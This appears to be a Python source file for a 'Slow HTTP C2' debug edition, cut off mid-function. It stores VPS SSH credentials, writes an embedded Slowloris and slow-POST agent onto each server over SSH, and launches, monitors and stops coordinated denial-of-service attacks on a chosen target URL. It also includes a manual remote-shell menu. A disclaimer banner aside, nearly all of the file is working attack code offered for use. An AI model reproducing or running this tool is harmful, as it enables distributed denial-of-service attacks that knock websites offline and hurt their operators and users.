#!/usr/bin/env python3
"""
Slow HTTP C2 - Troubleshooting & Debug Version
Adds detailed debugging and error reporting
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Style
from urllib.parse import urlparse

colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            try:
                os.chmod(key_file, 0o600)
            except:
                pass
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                agent_deployed BOOLEAN DEFAULT 0
            )
        ''')
        
        cursor.execute("PRAGMA table_info(vps_nodes)")
        columns = [column[1] for column in cursor.fetchall()]
        
        if 'agent_deployed' not in columns:
            try:
                cursor.execute("ALTER TABLE vps_nodes ADD COLUMN agent_deployed BOOLEAN DEFAULT 0")
            except sqlite3.OperationalError:
                pass
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        try:
            os.chmod(self.db_file, 0o600)
        except:
            pass
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, agent_deployed)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location, 0))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        except sqlite3.OperationalError:
            cursor.execute('SELECT id, ip_address, username, password, ssh_port, status, created_at, last_seen, location FROM vps_nodes ORDER BY id')
        
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status, agent_deployed=None):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            if agent_deployed is not None:
                cursor.execute('''
                    UPDATE vps_nodes SET status = ?, last_seen = ?, agent_deployed = ? WHERE ip_address = ?
                ''', (status, datetime.now().isoformat(), agent_deployed, ip))
            else:
                cursor.execute('''
                    UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
                ''', (status, datetime.now().isoformat(), ip))
        except sqlite3.OperationalError:
            cursor.execute('''
                UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
            ''', (status, datetime.now().isoformat(), ip))
        
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}
        self.lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                self.connections[ip] = ssh
            
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def execute_command(self, ip, command, timeout=60):
        if ip not in self.connections:
            return False, "No connection to VPS"
        
        try:
            with self.lock:
                ssh_client = self.connections[ip]
            
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            exit_status = stdout.channel.recv_exit_status()
            
            # DEBUG: Print detailed command execution info
            print(f"{Colors.BLUE}[DEBUG] Command: {command[:50]}...{Colors.RESET}")
            print(f"{Colors.BLUE}[DEBUG] Exit status: {exit_status}{Colors.RESET}")
            if output:
                print(f"{Colors.BLUE}[DEBUG] Output: {output[:200]}...{Colors.RESET}")
            if error:
                print(f"{Colors.RED}[DEBUG] Error: {error[:200]}...{Colors.RESET}")
            
            if exit_status == 0:
                return True, output if output else "Command executed successfully"
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except Exception as e:
            print(f"{Colors.RED}[DEBUG] Execute exception: {str(e)}{Colors.RESET}")
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy agent with enhanced debugging"""
        
        print(f"{Colors.CYAN}[DEBUG] Starting agent deployment to {ip}{Colors.RESET}")
        
        # Simplified, more reliable agent script
        agent_script = '''#!/usr/bin/env python3
import socket, threading, time, sys, random, string, signal, argparse
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self, host, port=80):
        self.host = host
        self.port = port
        self.conns = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0, 'active': 0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((self.host, self.port))
            return sock
        except Exception:
            with self.lock:
                self.stats['errors'] += 1
            return None
    
    def slowloris_attack(self, num_conns=100, delay=15, duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s")
        
        self.running = True
        start_time = time.time()
        
        # Create connections
        for i in range(num_conns):
            if not self.running:
                break
            
            sock = self.create_socket()
            if sock:
                try:
                    # Send incomplete HTTP request
                    request = f"GET /?id={random.randint(1000,99999)} HTTP/1.1\\r\\n"
                    request += f"Host: {self.host}\\r\\n"
                    request += "User-Agent: SlowHTTP/1.0\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    
                    sock.send(request.encode())
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent'] += 1
                        
                except Exception:
                    with self.lock:
                        self.stats['errors'] += 1
                    try:
                        sock.close()
                    except:
                        pass
            
            time.sleep(0.1)
        
        print(f"[PHASE1] Created {len(self.conns)} connections")
        
        # Keep alive
        cycle_count = 0
        while self.running and self.conns:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            cycle_count += 1
            dead_conns = []
            
            for sock in self.conns:
                try:
                    header = f"X-Keep-{random.randint(1,999)}: alive\\r\\n"
                    sock.send(header.encode())
                    with self.lock:
                        self.stats['sent'] += 1
                except Exception:
                    dead_conns.append(sock)
                    with self.lock:
                        self.stats['errors'] += 1
            
            for sock in dead_conns:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
            
            with self.lock:
                self.stats['active'] = len(self.conns)
                if cycle_count % 5 == 0:
                    print(f"[CYCLE {cycle_count}] Active: {self.stats['active']}")
            
            time.sleep(delay)
        
        self.stop()
    
    def slow_post_attack(self, num_conns=50, delay=1, duration=0):
        print(f"[SLOW POST] Starting attack on {self.host}:{self.port}")
        
        self.running = True
        start_time = time.time()
        
        def post_worker(worker_id):
            sock = self.create_socket()
            if not sock:
                return
            
            try:
                content_length = 1000000
                
                headers = f"POST /upload HTTP/1.1\\r\\n"
                headers += f"Host: {self.host}\\r\\n"
                headers += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                headers += f"Content-Length: {content_length}\\r\\n"
                headers += "\\r\\n"
                
                sock.send(headers.encode())
                
                bytes_sent = 0
                while self.running and bytes_sent < content_length:
                    if duration > 0 and (time.time() - start_time) >= duration:
                        break
                    
                    data = "A" * 10
                    try:
                        sock.send(data.encode())
                        bytes_sent += 10
                    except Exception:
                        break
                    
                    time.sleep(delay)
                
            except Exception:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        threads = []
        for i in range(num_conns):
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
        
        while self.running and any(t.is_alive() for t in threads):
            if duration > 0 and (time.time() - start_time) >= duration:
                self.running = False
                break
            time.sleep(10)
        
        self.stop()
    
    def stop(self):
        self.running = False
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()

attacker = None

def signal_handler(sig, frame):
    global attacker
    if attacker:
        attacker.stop()
    sys.exit(0)

def main():
    global attacker
    
    parser = argparse.ArgumentParser()
    parser.add_argument('target')
    parser.add_argument('attack_type', choices=['slowloris', 'slow_post'])
    parser.add_argument('--connections', '-c', type=int, default=100)
    parser.add_argument('--delay', '-d', type=int, default=15)
    parser.add_argument('--duration', '-t', type=int, default=0)
    
    args = parser.parse_args()
    
    # Parse target
    if args.target.startswith(('http://', 'https://')):
        parsed = urlparse(args.target)
        target_host = parsed.hostname
        target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    else:
        if ':' in args.target:
            target_host, port_str = args.target.split(':', 1)
            try:
                target_port = int(port_str)
            except ValueError:
                target_port = 80
        else:
            target_host = args.target
            target_port = 80
    
    print("SLOW HTTP AGENT - SIMPLE VERSION")
    print(f"Target: {target_host}:{target_port}")
    print(f"Attack: {args.attack_type}")
    
    signal.signal(signal.SIGINT, signal_handler)
    attacker = SlowHTTPAttack(target_host, target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        else:
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
    except Exception as e:
        print(f"Error: {e}")
        attacker.stop()

if __name__ == "__main__":
    main()
'''
        
        # Deployment steps with detailed debugging
        steps = [
            ("Create directory", "mkdir -p /tmp/slowhttp_c2"),
            ("Remove old agent", "rm -f /tmp/slowhttp_c2/agent.py"),
            ("Check Python", "python3 --version"),
            ("Check disk space", "df -h /tmp"),
            ("Check permissions", "ls -la /tmp/")
        ]
        
        print(f"{Colors.CYAN}[DEBUG] Running preliminary checks...{Colors.RESET}")
        
        for step_name, cmd in steps:
            print(f"{Colors.BLUE}[DEBUG] {step_name}: {cmd}{Colors.RESET}")
            success, output = self.execute_command(ip, cmd, timeout=30)
            if not success and "Remove old agent" not in step_name:
                return False, f"{step_name} failed: {output}"
        
        # Deploy agent using echo method (most reliable)
        print(f"{Colors.CYAN}[DEBUG] Deploying agent script...{Colors.RESET}")
        
        try:
            # Create empty file
            success, output = self.execute_command(ip, "echo '#!/usr/bin/env python3' > /tmp/slowhttp_c2/agent.py")
            if not success:
                return False, f"Failed to create agent file: {output}"
            
            # Write script line by line (safer method)
            lines = agent_script.strip().split('\n')
            
            for i, line in enumerate(lines[1:], 1):  # Skip shebang line
                # Escape quotes and backslashes
                escaped_line = line.replace("'", "'\"'\"'").replace('\\', '\\\\')
                cmd = f"echo '{escaped_line}' >> /tmp/slowhttp_c2/agent.py"
                
                success, output = self.execute_command(ip, cmd, timeout=15)
                if not success:
                    return False, f"Failed at line {i}: {output}"
                
                # Progress indicator for long scripts
                if i % 50 == 0:
                    print(f"{Colors.YELLOW}[DEBUG] Written {i}/{len(lines)} lines{Colors.RESET}")
            
        except Exception as e:
            return False, f"Script writing failed: {str(e)}"
        
        # Final steps with detailed verification
        final_steps = [
            ("Set permissions", "chmod +x /tmp/slowhttp_c2/agent.py"),
            ("Verify file size", "wc -l /tmp/slowhttp_c2/agent.py"),
            ("Check syntax", "python3 -m py_compile /tmp/slowhttp_c2/agent.py"),
            ("Test import", "python3 -c 'import sys; sys.path.insert(0, \"/tmp/slowhttp_c2\"); import agent'"),
            ("Test help", "cd /tmp/slowhttp_c2 && python3 agent.py --help")
        ]
        
        print(f"{Colors.CYAN}[DEBUG] Running final verification...{Colors.RESET}")
        
        for step_name, cmd in final_steps:
            print(f"{Colors.BLUE}[DEBUG] {step_name}: {cmd}{Colors.RESET}")
            success, output = self.execute_command(ip, cmd, timeout=30)
            if not success:
                # Don't fail on help command - it might exit with non-zero
                if "Test help" in step_name and "usage:" in output.lower():
                    print(f"{Colors.GREEN}[DEBUG] Help command worked (exit code ignored){Colors.RESET}")
                    continue
                return False, f"{step_name} failed: {output}"
            else:
                print(f"{Colors.GREEN}[DEBUG] {step_name} successful{Colors.RESET}")
        
        return True, "Agent deployed and verified successfully"
    
    def get_connection_status(self, ip):
        with self.lock:
            return ip in self.connections

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Enhanced attack launcher with detailed debugging"""
        
        print(f"{Colors.CYAN}[DEBUG] Starting attack launch process...{Colors.RESET}")
        print(f"{Colors.CYAN}[DEBUG] Target: {target_url}{Colors.RESET}")
        print(f"{Colors.CYAN}[DEBUG] Type: {attack_type}{Colors.RESET}")
        print(f"{Colors.CYAN}[DEBUG] VPS count: {len(vps_list)}{Colors.RESET}")
        print(f"{Colors.CYAN}[DEBUG] Parameters: {parameters}{Colors.RESET}")
        
        # Parse target
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
        else:
            target_host = target_url.split(':')[0].split('/')[0]
            target_port = 80
            use_ssl = False
        
        print(f"{Colors.CYAN}[DEBUG] Parsed - Host: {target_host}, Port: {target_port}, SSL: {use_ssl}{Colors.RESET}")
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        target_spec = f"{target_host}:{target_port}"
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} on {target_spec}{Colors.RESET}")
        
        success_count = 0
        failure_details = []
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ")
            
            # Pre-launch checks
            print(f"{Colors.BLUE}[DEBUG] Checking VPS connection...{Colors.RESET}")
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.RED}[DEBUG] No SSH connection to {vps_ip}{Colors.RESET}")
                failure_details.append(f"{vps_ip}: No SSH connection")
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                continue
            
            # Check if agent exists
            print(f"{Colors.BLUE}[DEBUG] Checking agent file...{Colors.RESET}")
            check_success, check_output = self.ssh_manager.execute_command(
                vps_ip, "ls -la /tmp/slowhttp_c2/agent.py", timeout=10
            )
            
            if not check_success:
                print(f"{Colors.RED}[DEBUG] Agent file not found on {vps_ip}{Colors.RESET}")
                failure_details.append(f"{vps_ip}: Agent file not found")
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                continue
            
            # Build attack command with debugging
            connections = max(1, parameters.get('connections', 100))
            delay = max(0, parameters.get('delay', 15))
            duration = parameters.get('duration', 0)
            
            print(f"{Colors.BLUE}[DEBUG] Command parameters - Conn: {connections}, Delay: {delay}, Duration: {duration}{Colors.RESET}")
            
            cmd_parts = [
                "cd /tmp/slowhttp_c2",
                f"nohup python3 agent.py '{target_spec}' {attack_type}",
                f"--connections {connections}",
                f"--delay {delay}"
            ]
            
            if duration > 0:
                cmd_parts.append(f"--duration {duration}")
            
            timestamp = int(time.time())
            cmd_parts.extend([
                f"> attack_{timestamp}.log 2>&1 &",
                "sleep 3",
                "echo 'Command launched'",
                f"tail -5 attack_{timestamp}.log 2>/dev/null || echo 'Log not ready yet'"
            ])
            
            cmd = " && ".join(cmd_parts)
            
            print(f"{Colors.BLUE}[DEBUG] Executing command: {cmd[:100]}...{Colors.RESET}")
            
            # Execute attack command
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
            
            print(f"{Colors.BLUE}[DEBUG] Command result - Success: {success}{Colors.RESET}")
            print(f"{Colors.BLUE}[DEBUG] Output: {output[:200]}...{Colors.RESET}")
            
            # Enhanced success detection
            success_indicators = [
                "Command launched",
                "Starting attack",
                "SLOWLORIS",
                "SLOW POST",
                "Target:",
                "attack on"
            ]
            
            if success and any(indicator in output for indicator in success_indicators):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                
                # Additional verification
                verify_cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
                
                if verify_success and verify_output.strip():
                    print(f"{Colors.GREEN}[DEBUG] Process verified: {verify_output.strip()}{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[DEBUG] Process verification inconclusive{Colors.RESET}")
                    
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                failure_details.append(f"{vps_ip}: Launch failed - {output[:100]}")
        
        print(f"\n{Colors.BOLD}[LAUNCH SUMMARY]{Colors.RESET}")
        print(f"Successful launches: {Colors.GREEN}{success_count}{Colors.RESET}")
        print(f"Failed launches: {Colors.RED}{len(failure_details)}{Colors.RESET}")
        
        if failure_details:
            print(f"\n{Colors.RED}[FAILURE DETAILS]{Colors.RESET}")
            for detail in failure_details:
                print(f"  • {detail}")
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS{Colors.RESET}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            print(f"\n{Colors.YELLOW}[TROUBLESHOOTING SUGGESTIONS]{Colors.RESET}")
            print("1. Check VPS connections: Menu 1 → Option 2")
            print("2. Deploy agents: Menu 1 → Option 3") 
            print("3. Verify target is reachable from VPS")
            print("4. Check VPS has Python3 installed")
            print("5. Verify no firewall blocking outbound connections")
            return False
    
    def stop_attack(self, session_id):
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[STOPPING] Stopping attack...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            cmd = "pkill -f 'python3.*agent.py' 2>/dev/null; sleep 1; ps aux | grep 'agent.py' | grep -v grep | wc -l"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            if success and output.strip() == '0':
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            else:
                print(f"{Colors.YELLOW}PARTIAL{Colors.RESET}")
                stop_count += 1
        
        self.active_attacks[session_id]['status'] = 'stopped'
        return True, f"Stop sent to {stop_count} VPS"
    
    def get_attack_status(self, session_id):
        if session_id not in self.active_attacks:
            return {}
        
        vps_list = self.active_attacks[session_id]['vps_list']
        status = {}
        
        for vps_ip in vps_list:
            cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
            success, output = self.ssh_manager.execute_command(vps_ip, cmd)
            
            active_processes = 0
            if success and output.strip().isdigit():
                active_processes = int(output.strip())
            
            status[vps_ip] = {
                'active_processes': active_processes,
                'status': 'attacking' if active_processes > 0 else 'idle'
            }
        
        return status

# Diagnostic and troubleshooting functions
def diagnose_vps_issues(ssh_manager, vps_list):
    """Comprehensive VPS diagnostics"""
    print(f"\n{Colors.BOLD}=== VPS DIAGNOSTICS ==={Colors.RESET}")
    
    issues_found = []
    
    for vps in vps_list:
        ip = vps[1]
        print(f"\n{Colors.CYAN}[DIAGNOSING] {ip}{Colors.RESET}")
        
        if not ssh_manager.get_connection_status(ip):
            issues_found.append(f"{ip}: No SSH connection")
            print(f"{Colors.RED}  ✗ No SSH connection{Colors.RESET}")
            continue
        
        # Check Python3
        success, output = ssh_manager.execute_command(ip, "python3 --version")
        if success and "Python 3" in output:
            print(f"{Colors.GREEN}  ✓ Python3: {output}{Colors.RESET}")
        else:
            issues_found.append(f"{ip}: Python3 not available")
            print(f"{Colors.RED}  ✗ Python3 issue: {output}{Colors.RESET}")
        
        # Check disk space
        success, output = ssh_manager.execute_command(ip, "df -h /tmp | tail -1")
        if success:
            print(f"{Colors.GREEN}  ✓ Disk space: {output.split()[3]} available{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}  ! Disk space check failed{Colors.RESET}")
        
        # Check agent file
        success, output = ssh_manager.execute_command(ip, "ls -la /tmp/slowhttp_c2/agent.py 2>/dev/null")
        if success:
            print(f"{Colors.GREEN}  ✓ Agent file exists{Colors.RESET}")
        else:
            issues_found.append(f"{ip}: Agent file missing")
            print(f"{Colors.RED}  ✗ Agent file missing{Colors.RESET}")
        
        # Check network connectivity (example with google.com)
        success, output = ssh_manager.execute_command(ip, "timeout 5 nc -z google.com 80", timeout=10)
        if success:
            print(f"{Colors.GREEN}  ✓ Internet connectivity{Colors.RESET}")
        else:
            issues_found.append(f"{ip}: Network connectivity issues")
            print(f"{Colors.RED}  ✗ Network connectivity issues{Colors.RESET}")
    
    if issues_found:
        print(f"\n{Colors.RED}[ISSUES FOUND]{Colors.RESET}")
        for issue in issues_found:
            print(f"  • {issue}")
    else:
        print(f"\n{Colors.GREEN}[ALL CHECKS PASSED]{Colors.RESET}")
    
    return len(issues_found) == 0

def test_target_connectivity(ssh_manager, vps_list, target_host, target_port):
    """Test if VPS can reach target"""
    print(f"\n{Colors.BOLD}=== TARGET CONNECTIVITY TEST ==={Colors.RESET}")
    print(f"Testing connectivity to {target_host}:{target_port}")
    
    reachable_count = 0
    
    for vps in vps_list:
        ip = vps[1]
        print(f"{Colors.CYAN}[TESTING] {ip} → {target_host}:{target_port}...{Colors.RESET} ", end="", flush=True)
        
        if not ssh_manager.get_connection_status(ip):
            print(f"{Colors.RED}NO SSH{Colors.RESET}")
            continue
        
        # Test TCP connectivity
        cmd = f"timeout 10 nc -z {target_host} {target_port}"
        success, output = ssh_manager.execute_command(ip, cmd, timeout=15)
        
        if success:
            print(f"{Colors.GREEN}REACHABLE{Colors.RESET}")
            reachable_count += 1
        else:
            print(f"{Colors.RED}UNREACHABLE{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}Result: {reachable_count}/{len(vps_list)} VPS can reach target{Colors.RESET}")
    return reachable_count > 0

# Enhanced TUI with diagnostics
class SlowHTTPTUI:
    def __init__(self):
        self.security_manager = SecurityManager()
        self.db_manager = DatabaseManager()
        self.ssh_manager = SSHManager(self.security_manager)
        self.attack_manager = AttackManager(self.ssh_manager, self.db_manager)
        self.running = True
        
        signal.signal(signal.SIGINT, self._signal_handler)
    
    def _signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[EXIT] Shutting down...{Colors.RESET}")
        sys.exit(0)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        banner = f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║              SLOW HTTP C2 - DEBUG EDITION                   ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.RED}{Colors.BOLD}⚠️ FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️{Colors.RESET}
"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}MAIN MENU:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} VPS Management
{Colors.GREEN}[2]{Colors.RESET} Launch Attack (Debug)
{Colors.GREEN}[3]{Colors.RESET} Monitor Attacks
{Colors.GREEN}[4]{Colors.RESET} Diagnostics & Troubleshooting
{Colors.GREEN}[5]{Colors.RESET} System Status
{Colors.GREEN}[0]{Colors.RESET} Exit

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        print(menu)
    
    def input_with_prompt(self, prompt, required=True):
        while True:
            try:
                value = input(f"{Colors.CYAN}{prompt}{Colors.RESET}").strip()
                if not required or value:
                    return value
                print(f"{Colors.RED}This field is required{Colors.RESET}")
            except KeyboardInterrupt:
                return None
    
    def diagnostics_menu(self):
        """New diagnostics menu to help troubleshoot issues"""
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}DIAGNOSTICS & TROUBLESHOOTING{Colors.RESET}")
        print("=" * 40)
        
        menu = f"""
{Colors.BOLD}DIAGNOSTIC OPTIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Run VPS Diagnostics
{Colors.GREEN}[2]{Colors.RESET} Test Target Connectivity  
{Colors.GREEN}[3]{Colors.RESET} Manual Command Execution
{Colors.GREEN}[4]{Colors.RESET} View System Logs
{Colors.GREEN}[5]{Colors.RESET} Clean All VPS (Remove agents)
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
        
        print(menu)
        choice = input().strip()
        
        if choice == '1':
            self.run_vps_diagnostics()
        elif choice == '2':
            self.test_target_connectivity()
        elif choice == '3':
            self.manual_command_execution()
        elif choice == '4':
            self.view_logs()
        elif choice == '5':
            self.clean_all_vps()
        elif choice == '0':
            return
        
        input("Press Enter to continue...")
    
    def run_vps_diagnostics(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS for diagnostics{Colors.RESET}")
            return
        
        diagnose_vps_issues(self.ssh_manager, online_vps)
    
    def test_target_connectivity(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS for testing{Colors.RESET}")
            return
        
        target = self.input_with_prompt("Enter target (host:port or URL): ")
        if not target:
            return
        
        # Parse target
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            target_host = parsed.hostname
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            if ':' in target:
                target_host, port_str = target.split(':', 1)
                try:
                    target_port = int(port_str)
                except ValueError:
                    target_port = 80
            else:
                target_host = target
                target_port = 80
        
        test_target_connectivity(self.ssh_manager, online_vps, target_host, target_port)
    
    def manual_command_execution(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS available{Colors.RESET}")
            return
        
        print(f"\n{Colors.BOLD}MANUAL COMMAND EXECUTION{Colors.RESET}")
        
        # Show available VPS
        for i, vps in enumerate(online_vps, 1):
            print(f"{i}. {vps[1]} ({vps[8] if len(vps) > 8 else 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if not 0 <= idx < len(online_vps):
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                return
            
            selected_vps = online_vps[idx]
            ip = selected_vps[1]
            
            print(f"\n{Colors.CYAN}Selected VPS: {ip}{Colors.RESET}")
            print(f"{Colors.YELLOW}Enter commands (type 'exit' to quit):{Colors.RESET}")
            
            while True:
                command = input(f"{Colors.GREEN}{ip}$ {Colors.RESET}").strip()
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if not command:
                    continue
                
                success, output = self.ssh_manager.execute_command(ip, command, timeout=30)
                
                if success:
                    print(output)
                else:
                    print(f"{Colors.RED}Error: {output}{Colors.RESET}")
                    
        except KeyboardInterrupt:
